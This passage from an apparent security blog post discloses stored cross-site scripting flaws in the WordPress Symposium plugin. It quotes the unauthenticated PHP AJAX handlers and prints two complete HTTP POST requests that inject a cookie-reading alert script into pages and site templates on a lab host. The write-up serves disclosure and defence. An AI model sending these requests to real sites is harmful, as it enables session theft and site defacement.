class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">r</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254e98194891822-76"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">exit</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c9863254e98194891822-77"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0151 seconds] -->
<p>This long bit of code will effectively take in any arbitrary text input and add a new page with said input. As there&#8217;s no validation of the current user being authenticated, leave alone being an user with appropiate privileges to do this, we can exploit this to pull off a persistent XSS by adding a new page:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9863254ea3984360171" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_ajax_functions.php HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 93

action=add_new_page&amp;name=Hello this is dog&amp;shortcode=&lt;script&gt;alert(document.cookie);&lt;/script&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9863254ea3984360171-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254ea3984360171-2">2</div><div class="crayon-num" data-line="crayon-53c9863254ea3984360171-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254ea3984360171-4">4</div><div class="crayon-num" data-line="crayon-53c9863254ea3984360171-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254ea3984360171-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9863254ea3984360171-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_ajax_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254ea3984360171-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9863254ea3984360171-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254ea3984360171-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">93</span></div><div class="crayon-line" id="crayon-53c9863254ea3984360171-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254ea3984360171-6"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">add_new_page</span><span class="crayon-o">&amp;</span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-e">Hello </span><span class="crayon-r">this</span><span class="crayon-h"> </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-i">dog</span><span class="crayon-o">&amp;</span><span class="crayon-v">shortcode</span><span class="crayon-o">=</span><span class="crayon-ta">&lt;script&gt;</span><span class="crayon-r">alert</span><span class="crayon-sy">(</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-i">cookie</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-ta">&lt;/script&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0029 seconds] -->
<p><strong>Analysis of import_template_file vulnerability</strong><br />
The last vulnerability in <a href="http://plugins.trac.wordpress.org/browser/wp-symposium/tags/12.06.30/ajax/symposium_ajax_functions.php?rev=565782">/ajax/symposium_ajax_functions.php</a> is a bit more fun, because it does not directly touch the DB in this code. Rather, it uses the symposium_update_import_snippet function to extraplote a value to insert into the database through <a href="http://codex.wordpress.org/Function_Reference/update_option">update_option</a>. By being a bit crafty with our request, we can once again cause a persistent XSS due to a lack of validation of the calling user, since we can ship our payload into parts of the template, many of which are used by *most* pages.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9863254ead843034898" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
if ($action == "import_template_file") {

	$import_file = $_POST['import_file'];
	
	symposium_update_import_snippet("template_profile_header", $import_file);
	symposium_update_import_snippet("template_profile_body", $import_file);
	symposium_update_import_snippet("template_page_footer", $import_file);
	symposium_update_import_snippet("template_email", $import_file);
	symposium_update_import_snippet("template_forum_header", $import_file);
	symposium_update_import_snippet("template_mail", $import_file);
	symposium_update_import_snippet("template_mail_tray", $import_file);
	symposium_update_import_snippet("template_mail_message", $import_file);
	symposium_update_import_snippet("template_group", $import_file);
	symposium_update_import_snippet("template_forum_category", $import_file);
	symposium_update_import_snippet("template_forum_topic", $import_file);
	symposium_update_import_snippet("template_group_forum_category", $import_file);
	symposium_update_import_snippet("template_group_forum_topic", $import_file);

	echo 'OK';
	exit;
}
function symposium_update_import_snippet($tag, $import_file) {
	global $wpdb;
	$start = strpos($import_file, "&lt;!-- ".$tag." --&gt;") + strlen("&lt;!-- ".$tag." --&gt;")+1;
	$end = strpos($import_file, "&lt;!-- end_".$tag." --&gt;");
	$snippet = substr($import_file, $start, $end-$start-1);
	update_option('symposium_'.$tag, $snippet);
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9863254ead843034898-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254ead843034898-2">2</div><div class="crayon-num" data-line="crayon-53c9863254ead843034898-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254ead843034898-4">4</div><div class="crayon-num" data-line="crayon-53c9863254ead843034898-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254ead843034898-6">6</div><div class="crayon-num" data-line="crayon-53c9863254ead843034898-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254ead843034898-8">8</div><div class="crayon-num" data-line="crayon-53c9863254ead843034898-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254ead843034898-10">10</div><div class="crayon-num" data-line="crayon-53c9863254ead843034898-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254ead843034898-12">12</div><div class="crayon-num" data-line="crayon-53c9863254ead843034898-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254ead843034898-14">14</div><div class="crayon-num" data-line="crayon-53c9863254ead843034898-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254ead843034898-16">16</div><div class="crayon-num" data-line="crayon-53c9863254ead843034898-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254ead843034898-18">18</div><div class="crayon-num" data-line="crayon-53c9863254ead843034898-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254ead843034898-20">20</div><div class="crayon-num" data-line="crayon-53c9863254ead843034898-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254ead843034898-22">22</div><div class="crayon-num" data-line="crayon-53c9863254ead843034898-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254ead843034898-24">24</div><div class="crayon-num" data-line="crayon-53c9863254ead843034898-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254ead843034898-26">26</div><div class="crayon-num" data-line="crayon-53c9863254ead843034898-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254ead843034898-28">28</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9863254ead843034898-1"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">action</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"import_template_file"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254ead843034898-2">&nbsp;</div><div class="crayon-line" id="crayon-53c9863254ead843034898-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">import_file</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'import_file'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254ead843034898-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c9863254ead843034898-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_profile_header"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254ead843034898-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_profile_body"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9863254ead843034898-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_page_footer"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254ead843034898-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_email"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9863254ead843034898-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_forum_header"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254ead843034898-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_mail"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9863254ead843034898-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_mail_tray"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254ead843034898-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_mail_message"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9863254ead843034898-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_group"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254ead843034898-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_forum_category"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9863254ead843034898-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_forum_topic"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254ead843034898-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_group_forum_category"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9863254ead843034898-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_group_forum_topic"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254ead843034898-18">&nbsp;</div><div class="crayon-line" id="crayon-53c9863254ead843034898-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'OK'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254ead843034898-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">exit</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9863254ead843034898-21"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254ead843034898-22"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">tag</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9863254ead843034898-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254ead843034898-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">start</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">strpos</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&lt;!-- "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">tag</span><span class="crayon-sy">.</span><span class="crayon-s">" --&gt;"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-e">strlen</span><span class="crayon-sy">(</span><span class="crayon-s">"&lt;!-- "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">tag</span><span class="crayon-sy">.</span><span class="crayon-s">" --&gt;"</span><span class="crayon-sy">)</span><span class="crayon-o">+</span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9863254ead843034898-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-st">end</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">strpos</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&lt;!-- end_"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">tag</span><span class="crayon-sy">.</span><span class="crayon-s">" --&gt;"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254ead843034898-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">snippet</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">substr</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">start</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-st">end</span><span class="crayon-o">-</span><span class="crayon-sy">$</span><span class="crayon-i">start</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9863254ead843034898-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">update_option</span><span class="crayon-sy">(</span><span class="crayon-s">'symposium_'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">tag</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">snippet</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254ead843034898-28"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0096 seconds] -->
<p>In our request, we need to add a bit of whatespace around our payload to allow for a margin of error, because the way it does the substringing isn&#8217;t that nice. This request will show how to do a simple alert, which will show on most pages on the site.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9863254eb8334377802" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_ajax_functions.php HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 167

action=import_template_file&amp;import_file=&lt;!-- template_forum_header --&gt;           &lt;script&gt;alert(document.cookie); &lt;/script&gt;           &lt;!-- end_template_forum_header --&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9863254eb8334377802-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254eb8334377802-2">2</div><div class="crayon-num" data-line="crayon-53c9863254eb8334377802-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254eb8334377802-4">4</div><div class="crayon-num" data-line="crayon-53c9863254eb8334377802-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9863254eb8334377802-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9863254eb8334377802-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_ajax_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254eb8334377802-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9863254eb8334377802-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254eb8334377802-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">167</span></div><div class="crayon-line" id="crayon-53c9863254eb8334377802-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9863254eb8334377802-6"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">import_template_file</span><span class="crayon-o">&amp;</span><span class="crayon-v">import_file</span><span class="crayon-o">=</span><span class="crayon-o">&lt;</span><span class="crayon-o">!</span><span class="crayon-o">--</span><span class="crayon-h"> </span><span class="crayon-e">template_forum_header</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-o">&gt;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-ta">&lt;script&gt;</span><span class="crayon-r">alert</span><span class="crayon-sy">(</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-i">cookie</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-ta">&lt;/script&gt;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">&lt;</span><span class="crayon-o">!</span><span class="crayon-o">--</span><span class="crayon-h"> </span><span class="crayon-i">end_template_forum_header</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0033 seconds] -->
<p></p>
					</div><!-- .entry-content -->

	<footer class="entry-meta">
				This entry was tagged <a href="http://ceriksen.com/tag/symposium/" rel="tag">Symposium</a>, <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>. Bookmark the <a href="http://ceriksen.com/2012/07/25/wordpress-symposium-plugin-multiple-sql-injection-vulnerabilities/" title="Permalink to WordPress Symposium plugin multiple stored XSS vulnerabilities" rel="bookmark">permalink</a>.
					</footer><!-- .entry-meta -->
</article><!-- #post-26 -->

					<nav id="nav-below">
		<h2 class="assistive-text">Post navigation</h2>

		
					<div class="nav-previous"><a href="http://ceriksen.com/2012/07/21/analysis-of-ios-games-tracking-traffic/" rel="prev"><span class="meta-nav">&larr;</span> Analysis of iOS Games tracking traffic</a></div>			<div class="nav-next"><a href="http://ceriksen.com/2012/07/25/wordpress-flexi-quote-rotator-plugin-multiple-vulnerabilities/" rel="next">WordPress Flexi Quote Rotator plugin multiple vulnerabilities <span class="meta-nav">&rarr;</span></a></div>						
	
	</nav><!-- #nav-below -->
	
						<div id="comments">
	
	
	
									<div id="respond" class="comment-respond">
